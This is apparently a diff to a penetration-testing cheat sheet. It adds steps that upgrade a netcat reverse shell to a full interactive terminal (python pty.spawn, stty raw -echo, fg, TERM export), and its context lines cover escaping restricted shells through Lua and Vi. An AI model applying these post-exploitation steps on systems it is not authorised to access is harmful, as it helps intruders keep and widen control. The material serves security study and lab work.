@@ -13,6 +13,12 @@ lua: os.execute('/bin/bash')
 # Using Vi
     :!bash
     :set shell=/bin/bash:shell
+Example
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+CTRL + Z         #backgrounds netcat session
+stty raw -echo
+fg               #brings netcat session back to the foreground
+export TERM=xterm
 
 ~~~Break Out of Restricted Shell (RBash,rsh,rksh)~~~
 
